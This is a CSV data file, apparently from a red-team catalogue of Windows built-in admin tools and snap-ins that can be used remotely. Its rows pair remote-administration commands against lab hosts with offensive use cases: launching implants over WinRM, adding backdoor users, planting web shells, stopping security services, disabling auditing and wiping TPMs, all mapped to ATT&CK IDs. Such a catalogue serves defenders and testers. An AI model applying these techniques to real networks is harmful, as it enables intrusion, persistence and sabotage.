"Name","Description","Updated","Toolsets","Commands","Commands_Command","Commands_Description","Commands_Usecases","Commands_Function","Commands_Comments","Commands_MitreAttack","Resources","Detections","Contributors","Contributors_Name","Contributors_Handle","Detections_Port","is_legit"
"StdRegProv","The StdRegProv class contains methods that manipulate system registry keys and values","2023-07-01","[''Builtin''-|-''CIMSession'']","","[''Invoke-CimMethod -ClassName StdRegProv -MethodName GetDWORDValue -Arguments @{hDefKey=[uint32]2147483650; sSubKeyName=""Software\Policies\Microsoft\Windows NT\Terminal Services""; sValueName=""Shadow""} -CimSession $s''-|-''Invoke-CimMethod -ClassName StdRegProv -MethodName SetDWORDValue -Arguments @{hDefKey=[uint32]2147483650; sSubKeyName=""Software\Policies\Microsoft\Windows NT\Terminal Services""; sValueName=""Shadow""; uValue=[uint32]2} -CimSession $s''-|-''Invoke-CimMethod -ClassName StdRegProv -MethodName DeleteValue -Arguments @{hDefKey=[uint32]2147483650; sSubKeyName=""Software\Policies\Microsoft\Windows NT\Terminal Services""; sValueName=""Shadow""} -CimSession $s'']","[''Query value''-|-''Set value''-|-''Delete value'']","[''None''-|-''None''-|-''None'']","[''Registry''-|-''Registry''-|-''Registry'']","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''Namespace: `ROOT\Cimv2`''-|-''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''Namespace: `ROOT\Cimv2`''-|-''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''Namespace: `ROOT\Cimv2`'']","[''None''-|-''None''-|-''None'']","None","None","","Arris Huijgen","bitsadmin","","false"
"MSFT_NetFirewallRule","Represents a Windows firewall rule","2023-07-01","[''Builtin''-|-''CIMSession'']","","$fwrule = Get-CimInstance -Namespace ROOT\StandardCimv2 -ClassName MSFT_NetFirewallRule -Filter 'DisplayName=""Remote Desktop - Shadow (TCP-In)""' -CimSession $s $fwrule $fwrule | Invoke-CimMethod -MethodName Enable","Enable firewall rule","None","Manage","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''Namespace: `ROOT\StandardCimv2`'']","None","None","None","","Arris Huijgen","bitsadmin","","false"
"MSFT_DNSClientCache","Represents a record in a DNS client cache","2023-07-01","[''Builtin''-|-''CIMSession'']","","Get-CimInstance -Namespace ROOT\StandardCimv2 -ClassName MSFT_DNSClientCache -CimSession $s","List cached DNS entries","Reconnaissance on the network/Internet activities on the computer","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''See also [Get-DnsClientCache](../../Cmdlets/Get-DnsClientCache)''-|-''Namespace: `ROOT\StandardCimv2`'']","None","None","None","","Arris Huijgen","bitsadmin","","false"
"CIM_LogicalFile","Represents a named collection of data located in a file system on a storage extent","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","None","None","None","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''Namespace: `ROOT\Cimv2`'']","None","None","None","","Arris Huijgen","bitsadmin","","false"
"CIM_Directory","Type of file that logically groups data files 'contained' in it, and provides path information for the grouped files","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","None","None","None","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''Namespace: `ROOT\Cimv2`'']","None","None","None","","Arris Huijgen","bitsadmin","","false"
"CIM_DataFile","Type of logical file that is a named collection of data or executable code","2024-12-13","[''Builtin''-|-''CIMSession'']","","Get-CimInstance -Query ""Select * from CIM_DataFile Where ((Drive = 'C:') AND (FileName = 'ntuser') AND (Extension = 'dat'))"" -CimSession $s","[''Locate files''-|-''Copy file'']","[''Perform reconaissance on filesystem''-|-''Copy file to Public share to copy it from there'']","[''Data''-|-''Data'']","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''Pretty slow''-|-''Namespace: `ROOT\Cimv2`''-|-''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)'']","[''None''-|-''None'']","None","None","","Arris Huijgen","bitsadmin","","false"
"winrm.cmd","Windows Remote Management","2023-07-01","Builtin","","[''winrm.vbs get wmicimv2/Win32_Process?Handle=3456 -r:W10.ad.bitsadmin.com''-|-''winrm.vbs invoke Create wmicimv2/Win32_Process -r:W10.ad.bitsadmin.com @{CommandLine=""notepad.exe"";CurrentDirectory=""C:\""}'']","[''Check process details''-|-''Lauch process'']","[''Reconnaissance on running processes''-|-''After having copied an implant over SMB, launch it'']","[''Processes''-|-''Execute'']","[''None''-|-''None'']","[''T1057''-|-''T1021.006''-|-''T1047''-|-''T1021.006'']","None","None","","Arris Huijgen","bitsadmin","","false"
"slmgr.vbs","Obtain volume activation information","2023-07-01","Builtin","","[''cscript.exe slmgr.vbs W10.ad.bitsadmin.com /dlv''-|-''cscript.exe slmgr.vbs W10.ad.bitsadmin.com /upk'']","[''Show Windows activation information''-|-''Uninstall Windows product key'']","[''None''-|-''Cripple Windows activation to maybe have an admin user connect to the system to fix it'']","[''Misc''-|-''Misc'']","[''None''-|-''None'']","[''None''-|-''None'']","None","None","","Arris Huijgen","bitsadmin","","false"
"pubprn.vbs","Publishes a printer to the Active Directory Domain Services","2023-07-01","[''Builtin''-|-''TODO'']","","cscript pubprn.vbs","None","None","Manage","Script is located in the `%SystemRoot%\System32\printing_Admin_Scripts\<language>` directory","None","None","None","","Arris Huijgen","bitsadmin","","false"
"ospp.vbs","Configure volume licensed versions of Office products","2023-07-01","Extra","","cscript.exe ospp.vbs W10.ad.bitsadmin.com /dstatusall","Show Office activation information","None","Misc","None","None","None","None","","Arris Huijgen","bitsadmin","","false"
"wsus.msc","Update Services","2023-07-01","[''GUI''-|-''RSAT'']","","wsus.msc","Update Services","Deploy malicious updates","Manage","[''Right click -> Connect to Server''-|-''Port 5830/TCP is used in case of HTTP, port 5831/TCP is used in case of TLS'']","None","None","","","Arris Huijgen","bitsadmin","[''5830/TCP''-|-''5831/TCP'']","false"
"wsecedit.dll","Security Configuration and Analysis","2023-07-01","[''Builtin''-|-''GUI'']","","[''mmc.exe''-|-''mmc.exe'']","[''Security Configuration and Analysis''-|-''Security Templates'']","[''None''-|-''None'']","[''Manage''-|-''Manage'']","[''Open via MMC's Add/Remove Snap-In -> Security Configuration and Analysis -> OK''-|-''Right click the node -> Open Database -> Enter whatever name -> Open -> Open the .inf file''-|-''Open via MMC's Add/Remove Snap-In -> Security Configuration and Analysis -> OK''-|-''Used to create .inf files from [secpol.msc](../secpol) settings'']","[''None''-|-''None'']","None","None","","Arris Huijgen","bitsadmin","","false"
"winsmgmt.msc","WINS","2023-07-01","[''GUI''-|-''RSAT'']","","winsmgmt.msc","WINS","None","Manage","[''Right click -> Add Server -> WINS server: `DC1.ad.bitsadmin.com` -> OK -> The specified server name could not be validated''-|-''To add this server to the console, type the IP address: `10.0.10.10` -> OK'']","None","None","","","Arris Huijgen","bitsadmin","[''445/TCP''-|-''135/TCP'']","false"
"wbadmin.msc","Windows Server Backup","2023-07-01","[''GUI''-|-''Server'']","","mmc.exe","Windows Server Backup","Purge backups?","Manage","mmc.exe -> File -> Add/Remove Snap-In -> Windows Server Backup -> Add -> Another computer: `DC1.ad.bitsadmin.com` -> Finish -> OK","T1485","None","","","Arris Huijgen","bitsadmin","135/TCP","false"
"virtmgmt.msc","Hyper-V Manager","2023-07-01","[''GUI''-|-''RSAT'']","","virtmgmt.msc","Hyper-V Manager","[''Connect to the console of a server which might be directly accessible because of an `AutoAdminLogon` registry setting, or because an admin has logged onto the console''-|-''Install an unmonitored offensive VM to use to pivot through the network'']","Manage","[''Right click root node -> Connect to Server -> Remote server -> `HYPERV1.ad.bitsadmin.com`''-|-''Uses ports 5985/TCP (WinRM, for management and non-enhanced session) and 2197/TCP (VMRDP for Enhanced Session) - Once a VM screen is opened (little display appears to be rendered over WinRM)''-|-''If a screen is opened without using the enhanced session functionality, it continues to use WinRM'']","None","None","","","Arris Huijgen","bitsadmin","[''5985/TCP''-|-''2197/TCP'']","false"
"tsgateway.msc","RD Gateway Manager","2023-07-01","[''GUI''-|-''RSAT'']","","tsgateway.msc","RD Gateway Manager","[''Disable auditing''-|-''Specify who can use the RD gateway and to which devices it can be used'']","Manage","Right click on RD Gateway Manager -> Connect to RD Gateway Server -> Remote server: `DC1.ad.bitsadmin.com`","None","None","","","Arris Huijgen","bitsadmin","135/TCP","false"
"tsconfig.msc","Remote Desktop Session Host Configuration","2023-07-01","[''GUI''-|-''Server'']","","tsconfig.msc","Remote Desktop Session Host Configuration","None","Manage","None","None","None","None","","Arris Huijgen","bitsadmin","","false"
"tsadmin.msc","Remote Desktop Services Manager","2023-07-01","[''GUI''-|-''Server'']","","tsadmin.msc","Remote Desktop Services Manager","None","Manage","Removed in Server 2012+. Copy `tsadmin.msc` and related files from Windows Server 2008 R2","None","https://woshub.com/how-to-run-tsadmin-msc-and-tsconfig-msc-snap-ins-on-windows-server-2012-rds/","None","","Arris Huijgen","bitsadmin","","false"
"tpm.msc","Trusted Platform Module (TPM) Management","2023-07-01","[''Builtin''-|-''GUI'']","","mmc.exe","Trusted Platform Module (TPM) Management","Wipe the TPM to impact availability; only the Bitlocker Recovery Key will then help to recover the data","Manage","Add or Remove Snap-ins -> TPM Management -> Add -> Another computer: `W11.ad.bitsadmin.com` -> OK","None","None","","","Arris Huijgen","bitsadmin","135/TCP","false"
"taskschd.msc","Task Scheduler","2023-11-04","[''Builtin''-|-''GUI'']","","taskschd.msc","Task Scheduler","Create backdoor for persistence: Advantage, an EDR will have a hard time to connect the persistence to the implant/backdoor that is running the SOCKS server","Execute","[''Right click -> Connect to Another Computer''-|-''Alternatively, use [compmgmt.msc](../compmgmt)'']","T1053.005","None","","","Arris Huijgen","bitsadmin","135/TCP","false"
"tapimgmt.msc","Telephony","2023-07-01","[''GUI''-|-''Server'']","","tapimgmt.msc","Telephony","None","Manage","Right click -> Add computer -> Another computer: `DC1.ad.bitsadmin.com` -> OK","None","None","","","Arris Huijgen","bitsadmin","445/TCP","false"
"services.msc","Services","2023-07-01","[''Builtin''-|-''GUI'']","","services.msc /computer:DC1.ad.bitsadmin.com","Services","[''Identify security solutions running on the endpoint''-|-''Stop/disable security services'']","Manage","Quite slow to collect information on all services through SOCKS, performs 4 requests (Open/Query/something/Close) for every service. Better use [sc.exe](../../Binaries/sc) in case the name of the service is known","T1569.002","None","","","Arris Huijgen","bitsadmin","135/TCP","false"
"secpol.msc","Local Security Policy","2023-07-01","[''Builtin''-|-''GUI'']","","gpedit.msc","Local Security Policy","None","Manage","[''Remotely just use [gpedit.msc](../gpedit)''-|-''Direct link to gpedit.msc -> Computer Configuration -> Windows Settings -> Security Settings'']","None","None","","","Arris Huijgen","bitsadmin","445/TCP","false"
"schmmgmt.dll","Active Directory Schema","2023-07-01","[''GUI''-|-''RSAT'']","","mmc.exe","Active Directory Schema","None","Domain","Open via MMC's Add/Remove Snap-in, then right click the root node -> Change Active Directory Domain Controller","None","None","","","Arris Huijgen","bitsadmin","[''389/UDP''-|-''445/TCP'']","false"
"rsop.msc","Resultant Set of Policy","2023-07-01","[''Builtin''-|-''GUI'']","","rsop.msc","Resultant Set of Policy","Perform reconnaissance on applied (security) policies on remote system","Domain","Right click RSoP -> Change Query -> Another computer: `DC1.ad.bitsadmin.com` -> Next -> Next -> Next -> Finish","None","None","None","","Arris Huijgen","bitsadmin","","false"
"rrasmgmt.msc","Routing and Remote Access","2023-07-01","[''GUI''-|-''RSAT'']","","rrasmgmt.msc /ComputerName DC1.ad.bitsadmin.com","Routing and Remote Access","Port mirror all traffic to us?","Manage","Alternative: Right click Routing and Remote Access -> Add Server -> The following computer: `DC1.ad.bitsadmin.com` -> OK","None","None","","","Arris Huijgen","bitsadmin","[''135/TCP''-|-''445/TCP'']","false"
"remoteprograms.msc","RemoteApp Manager","2023-07-01","[''GUI''-|-''Server'']","","remoteprograms.msc","RemoteApp Manager","None","Manage","Seems to be deprecated, nowadays management of remote apps seems to be done through [ServerManager.exe](../../Binaries/ServerManager)","None","None","None","","Arris Huijgen","bitsadmin","","false"
"printmanagement.msc","Print Management","2023-07-01","[''Builtin''-|-''GUI'']","","printmanagement.msc","Print Management","Install a malicious printer driver?","Manage","None","None","None","","","Arris Huijgen","bitsadmin","[''445/TCP''-|-''135/TCP'']","false"
"pkiview.msc","Enterprise PKI","2023-07-01","[''GUI''-|-''RSAT'']","","pkiview.msc","Enterprise PKI","None","Manage","Does not seem possible to use this snap-in remotely","None","None","None","","Arris Huijgen","bitsadmin","","false"
"perfmon.msc","Performance Monitor","2023-07-01","[''Builtin''-|-''GUI'']","","perfmon.msc","Performance Monitor","None","Manage","[''Action -> Connect to another computer -> Another computer: `DC1.ad.bitsadmin.com` -> OK''-|-''Requires ""Remote Registry"" service to be running on the remote host'']","None","None","","","Arris Huijgen","bitsadmin","135/TCP","false"
"ocsp.msc","Online Responder Management","2023-07-01","[''GUI''-|-''RSAT'']","","ocsp.msc /Computer:DC1.ad.bitsadmin.com","Online Responder Management","None","Manage","Alternative via GUI: Right click Online Responder -> Retarget Responder -> Another computer: `DC1.ad.bitsadmin.com` -> OK","None","None","","","Arris Huijgen","bitsadmin","135/TCP","false"
"nps.msc","Network Policy Server","2023-07-01","[''GUI''-|-''Server'']","","nps.msc /computer:DC1.ad.bitsadmin.com","Network Policy Server","None","Manage","Alternative: mmc.exe -> Add or Remove Snap-ins -> Network Policy Server -> Add -> Another computer -> `DC1.ad.bitsadmin.com` -> OK","None","None","","","Arris Huijgen","bitsadmin","445/TCP","false"
"nfsmgmt.msc","Services for NFS","2023-07-01","[''GUI''-|-''RSAT'']","","nfsmgmt.msc","Services for NFS","None","Manage","Right click on root node -> Connect to another computer -> Another computer: `DC1.ad.bitsadmin.com` -> OK","None","None","","","Arris Huijgen","bitsadmin","5985/TCP","false"
"lusrmgr.msc","Local Users and Groups","2023-11-04","[''Builtin''-|-''GUI'']","","lusrmgr.msc /computer=W10.ad.bitsadmin.com","Local Users and Groups","[''Add a backdoor user''-|-''Change password of existing user''-|-''Enable and disable accounts''-|-''Add users to, and remove users from groups''-|-''Configure backdoor logon script'']","Manage","[''Alternative is to use [compmgmt.msc](../compmgmt)''-|-''Through this snap-in it does not seem possible to add a user to a local group on the remote machine. Through [compmgmt.msc](../compmgmt) this _does_ work well though'']","[''T1531''-|-''T1136.001''-|-''T1078.003'']","None","","","Arris Huijgen","bitsadmin","445/TCP","false"
"lsdiag.msc","Remote Desktop Licensing Diagnoser","2023-07-01","[''GUI''-|-''RSAT'']","","lsdiag.msc","Remote Desktop Licensing Diagnoser","None","Manage","Right click root node -> Connect to Remote Desktop Session Host Server -> Another computer: `DC1.ad.bitsadmin.com` -> OK","None","None","","","Arris Huijgen","bitsadmin","[''445/TCP''-|-''135/TCP'']","false"
"ipsmsnap.dll","IP Security Monitor","2023-07-01","[''Builtin''-|-''GUI'']","","mmc.exe","IP Security Monitor","None","Manage","[''Open via MMC's Add/Remove Snap-ins, then right click the root node -> Add Computer -> The following computer: `DC1.ad.bitsadmin.com` -> OK''-|-''IPSec service needs to be running on the remote host'']","None","None","","","Arris Huijgen","bitsadmin","445/TCP","false"
"ipsecsnp.dll","IP Security Policy Management","2023-07-01","[''Builtin''-|-''GUI'']","","[''mmc.exe''-|-''mmc.exe'']","[''IP Security Policy Management for a computer''-|-''IP Security Policy Management for domain'']","[''Weaken IPSec requirements''-|-''Weaken IPSec requirements'']","[''Manage''-|-''Manage'']","[''Open via MMC's Add/Remove Snap-In -> IP Security Policy Management -> Another Active Directory domain: `DC1.ad.bitsadmin.com` -> Finish -> OK''-|-''Open via MMC's Add/Remove Snap-In -> IP Security Policy Management -> Another Active Directory domain: `ad.bitsadmin.com` -> Finish -> OK'']","[''None''-|-''None'']","None","","","Arris Huijgen","bitsadmin","[''389/UDP''-|-''445/TCP'']","false"
"iis6.msc","Internet Information Services (IIS) 6.0 Manager","2023-07-01","GUI","","iis6.msc","Internet Information Services (IIS) 6.0 Manager","None","Manage","Right click -> Connect -> Computer name: `DC1.ad.bitsadmin.com` -> OK","None","None","","","Arris Huijgen","bitsadmin","135/TCP","false"
"iis.msc","Internet Information Services (IIS) Manager","2023-07-01","GUI","","iis.msc","Internet Information Services (IIS) Manager","[''Create virtual directory with web shell (drop shell over SMB or maybe create virtual directory on share)''-|-''Add FTP site to be able to browse the filesystem''-|-''Weaken authentication''-|-''Add MIME Types to be able to download certain file extensions'']","Manage","[''Right click Start Page -> Connect to a Server -> Server name: `SP2019.ad.bitsadmin.com` -> Next -> Enter User name/password -> Next -> Connection Name: `SP2019` -> Finish''-|-''Requires to install and enabled Remote IIS Management service''-|-''Does not seem possible to perform authentication transparently through Kerberos''-|-''Can also be launched via `inetmgr.exe`'']","None","https://woshub.com/remote-iis-management-in-windows-server-2012/","","","Arris Huijgen","bitsadmin","8172/TCP","false"
"gptedit.msc","Group Policy Starter GPO Editor","2023-07-01","[''GUI''-|-''RSAT'']","","gptedit.msc /s /gtmpobject:""\\DC1.ad.bitsadmin.com\sysvol\ad.bitsadmin.com\StarterGPOs\{DE3EB8C2-A808-4509-9D89-D383F950AEDB}\""","Group Policy Starter GPO Editor","None","Domain","Edit Group Policy Starter GPO directly based on the path","None","None","","","Arris Huijgen","bitsadmin","445/TCP","false"
"gpme.msc","Group Policy Management Editor","2023-07-01","[''GUI''-|-''RSAT'']","","gpme.msc /gpobject:""LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=ad,DC=bitsadmin,DC=com""","Group Policy Management Editor","Execute immediate scheduled tasks on machines to launch implant","Domain","[''Only possible from OffensiveDC''-|-''Commandline launches editor for the GUID of the default domain policy; can be changed to other GUIDs to edit different policies'']","T1053.005","None","","","Arris Huijgen","bitsadmin","445/TCP","false"
"gpmc.msc","Group Policy Management","2023-07-01","[''GUI''-|-''RSAT'']","","gpmc.msc /domain:ad.bitsadmin.com","Group Policy Management","[''Create and link a malicious group policy to systems''-|-''Force the update of group policy on all machines in an OU'']","Domain","For remote domains, this needs to be executed from OffensiveDC. Also use the `/domain` parameter in the commandline. In View -> Options -> General, uncheck the ""Enable trust detection"" checkbox. Next, right click the root node -> Add forest","[''T1037.003''-|-''T1484.001'']","None","","","Arris Huijgen","bitsadmin","[''389/UDP''-|-''445/TCP'']","false"
"gpedit.msc","Local Group Policy Editor","2024-12-13","[''Builtin''-|-''GUI'']","","[''gpedit.msc /gpcomputer: DC1.ad.bitsadmin.com''-|-''gpedit.msc /gpobject:""LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=ad,DC=bitsadmin,DC=com""'']","[''Local Group Policy Editor for a computer''-|-''Local Group Policy Editor for a computer'']","[''Add evil startup script''-|-''Weaken security as a backdoor''-|-''Open ports in the firewall''-|-''Execute immediate scheduled tasks on machines to launch implant'']","[''Manage''-|-''Domain'']","[''Quotes around the hostname or in case of no quotes a space before the hostname seem to be required''-|-''Through SMB edits files in `\\DC1.ad.bitsadmin.com\ADMIN$\GroupPolicy` (= `%SystemRoot%\System32\GroupPolicy`)''-|-''Example edits Default Domain Policy, change GUID for editing other policies''-|-''Through SMB edits files in `\\ad.bitsadmin.com\SYSVOL\{GUID}` (= `%SystemRoot%\Sysvol\sysvol\ad.bitsadmin.com` by default) on the DC'']","[''None''-|-''T1037.003''-|-''T1484.001'']","None","","","Arris Huijgen","bitsadmin","445/TCP","false"
"fxsadmin.msc","Fax Service Manager","2023-07-01","[''GUI''-|-''Server'']","","fxsadmin.msc","Fax Service Manager","None","Manage","`mmc.exe` -> File -> Add/Remove Snap-In -> Fax Service Manager -> Add -> Another computer: `DC1.ad.bitsadmin.com` -> Finish -> OK","None","None","","","Arris Huijgen","bitsadmin","445/TCP","false"
"fsrm.msc","File Server Resource Manager","2023-07-01","[''GUI''-|-''RSAT'']","","fsrm.msc","File Server Resource Manager","None","Manage","Right click File Server Resource Manager -> Connect to Another Computer -> Another computer: `DC1.ad.bitsadmin.com`","None","None","","","Arris Huijgen","bitsadmin","[''445/TCP''-|-''135/TCP'']","false"
"fsmgmt.msc","Shared Folders","2023-07-01","[''Builtin''-|-''GUI'']","","fsmgmt.msc /computer:W10.ad.bitsadmin.com","Shared Folders","[''View which users are connected to the share from which computername''-|-''View which files are opened by which users''-|-''Add (hidden - dollar share) shared folder'']","Manage","Alternatively, use [compmgmt.msc](../compmgmt)","[''T1135''-|-''T1021.002'']","None","","","Arris Huijgen","bitsadmin","445/TCP","false"
